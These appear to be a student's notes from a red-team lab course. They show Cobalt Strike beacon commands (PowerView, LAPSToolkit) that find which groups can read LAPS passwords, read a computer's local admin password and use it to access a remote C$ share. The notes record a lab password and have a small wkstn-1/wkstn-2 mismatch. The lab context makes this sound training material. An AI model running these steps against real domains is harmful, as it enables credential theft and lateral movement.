
We can discover which principals are allowed to read the ms-Mcs-AdmPwd attribute by reading its DACL on each computer object.

importing `powerview.ps1`
```powershell
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1
[+] host called home, sent: 143784 bytes
```
from the book, unsure why mine isnt showing the entire sid...
```POWERSHELL
beacon> powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier
[*] Tasked beacon to run: Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier (unmanaged)
[+] host called home, sent: 138058 bytes
[+] received output:

ObjectDN                                                    SecurityIdentifier                     
--------                                                    ------------------                     
CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io       S-1-5-21-569305411-121244042-2357301...
CN=WEB,OU=Web Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io S-1-5-21-569305411-121244042-2357301...
CN=SQL-2,OU=SQL Servers,OU=Servers,DC=dev,DC=cyberbotic,... S-1-5-21-569305411-121244042-2357301...
CN=WKSTN-1,OU=Workstations,DC=dev,DC=cyberbotic,DC=io       S-1-5-21-569305411-121244042-2357301...
CN=FS,OU=File Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io S-1-5-21-569305411-121244042-2357301...

- this one showed
beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
[*] Tasked beacon to run: ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107 (unmanaged)
[+] host called home, sent: 138058 bytes
[+] received output:
DEV\Developers

- this one did not show
beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1108
DEV\Support Engineers

```
this worked with an `http` beacon, `DNS` beacons are shit
```powershell
[01/04 00:35:38] beacon> powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" }
[01/04 00:35:38] [+] host called home, sent: 10 bytes
[01/04 00:35:38] [*] Tasked beacon to run: Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } (unmanaged)
[01/04 00:35:38] [+] host called home, sent: 137945 bytes
[01/04 00:35:39] [+] host called home, sent: 103 bytes
[01/04 00:35:47] [+] received output:


AceQualifier           : AccessAllowed
ObjectDN               : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights  : ReadProperty, ExtendedRight
ObjectAceType          : ms-Mcs-AdmPwd
ObjectSID              : S-1-5-21-569305411-121244042-2357301523-1109
InheritanceFlags       : ContainerInherit
BinaryLength           : 72
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-569305411-121244042-2357301523-1107
AccessMask             : 272
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0


[01/04 00:35:48] [+] received output:
AceQualifier           : AccessAllowed
ObjectDN               : CN=WEB,OU=Web Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights  : ReadProperty, ExtendedRight
ObjectAceType          : ms-Mcs-AdmPwd
ObjectSID              : S-1-5-21-569305411-121244042-2357301523-1110
InheritanceFlags       : ContainerInherit
BinaryLength           : 72
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-569305411-121244042-2357301523-1108
AccessMask             : 272
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=SQL-2,OU=SQL Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights  : ReadProperty, ExtendedRight
ObjectAceType          : ms-Mcs-AdmPwd
ObjectSID              : S-1-5-21-569305411-121244042-2357301523-1112
InheritanceFlags       : ContainerInherit
BinaryLength           : 72
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-569305411-121244042-2357301523-1108
AccessMask             : 272
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=WKSTN-1,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights  : ReadProperty, ExtendedRight
ObjectAceType          : ms-Mcs-AdmPwd
ObjectSID              : S-1-5-21-569305411-121244042-2357301523-1116
InheritanceFlags       : ContainerInherit
BinaryLength           : 72
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-569305411-121244042-2357301523-1107
AccessMask             : 272
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=FS,OU=File Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights  : ReadProperty, ExtendedRight
ObjectAceType          : ms-Mcs-AdmPwd
ObjectSID              : S-1-5-21-569305411-121244042-2357301523-1124
InheritanceFlags       : ContainerInherit
BinaryLength           : 72
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-569305411-121244042-2357301523-1108
AccessMask             : 272
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0
```
converting the `SID`'s
```powershell
beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
[+] host called home, sent: 10 bytes
[*] Tasked beacon to run: ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107 (unmanaged)
[+] host called home, sent: 138048 bytes
[+] received output:
DEV\Developers

beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1108
[+] host called home, sent: 10 bytes
[*] Tasked beacon to run: ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1108 (unmanaged)
[+] host called home, sent: 138048 bytes
[+] received output:
DEV\Support Engineers
```
Dedicated tooling such as the [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) also exist.  `Find-LAPSDelegatedGroups` will query each OU and find domain groups that have delegated read access.
```powershell
beacon> powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
[*] Tasked beacon to import: C:\Tools\LAPSToolkit\LAPSToolkit.ps1
[+] host called home, sent: 23928 bytes
beacon> powerpick Find-LAPSDelegatedGroups
[+] host called home, sent: 10 bytes
[*] Tasked beacon to run: Find-LAPSDelegatedGroups (unmanaged)
[+] host called home, sent: 138048 bytes
[+] received output:

OrgUnit                                    Delegated Groups     
-------                                    ----------------     
OU=Workstations,DC=dev,DC=cyberbotic,DC=io DEV\Developers       
OU=Servers,DC=dev,DC=cyberbotic,DC=io      DEV\Support Engineers
OU=Web Servers,OU=Servers,DC=dev,DC=cyb... DEV\Support Engineers

[+] received output:
OU=SQL Servers,OU=Servers,DC=dev,DC=cyb... DEV\Support Engineers
OU=File Servers,OU=Servers,DC=dev,DC=cy... DEV\Support Engineers

```
`Find-AdmPwdExtendedRights` goes a little deeper and queries each individual computer for users that have "All Extended Rights".  This will reveal any users that can read the attribute without having had it specifically delegated to them.
```powershell
beacon> powerpick Find-AdmPwdExtendedRights
[+] host called home, sent: 10 bytes
[*] Tasked beacon to run: Find-AdmPwdExtendedRights (unmanaged)
[+] host called home, sent: 138048 bytes
[+] received output:

ComputerName              Identity              Reason   
------------              --------              ------   
wkstn-2.dev.cyberbotic.io DEV\Developers        Delegated
web.dev.cyberbotic.io     DEV\Support Engineers Delegated
sql-2.dev.cyberbotic.io   DEV\Support Engineers Delegated
wkstn-1.dev.cyberbotic.io DEV\Developers        Delegated

```
note that everytime you use a different `powershell-import` command `powerview` must be reimported

To get a computer's password, simply read the attribute.
```powershell
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1
[+] host called home, sent: 143784 bytes

beacon> powerpick Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd
[+] host called home, sent: 10 bytes
[*] Tasked beacon to run: Get-DomainComputer -Identity wkstn-2 -Properties ms-Mcs-AdmPwd (unmanaged)
[+] host called home, sent: 138048 bytes
[+] received output:

ms-mcs-admpwd 
------------- 
Hqx77eg4lw34Ne

```
The `make_token` command is an easy way to leverage it.
```powershell
beacon> make_token .\LapsAdmin Hqx77eg4lw34Ne
[+] Impersonated DEV\bfarmer

beacon> ls \\wkstn-1\c$
[*] Listing: \\wkstn-1\c$\

Size     Type    Last Modified         Name
----     ----    -------------         ----
          dir     08/16/2022 08:17:30   $Recycle.Bin
          dir     08/15/2022 22:22:31   $WinREAgent
          dir     01/27/2022 18:18:49   Documents and Settings
          dir     12/07/2019 09:14:52   PerfLogs
          dir     08/22/2022 00:15:03   Program Files
          dir     10/06/2021 13:57:25   Program Files (x86)
          dir     09/14/2022 09:50:27   ProgramData
          dir     08/17/2022 17:52:54   Recovery
          dir     09/14/2022 09:35:54   System Volume Information
          dir     08/16/2022 08:15:58   Users
          dir     09/09/2022 10:38:50   Windows
 8kb      fil     09/14/2022 08:12:19   DumpStack.log.tmp
 796mb    fil     09/14/2022 08:12:19   hiberfil.sys
 704mb    fil     09/14/2022 08:12:19   pagefile.sys
 16mb     fil     09/14/2022 08:12:19   swapfile.sys
```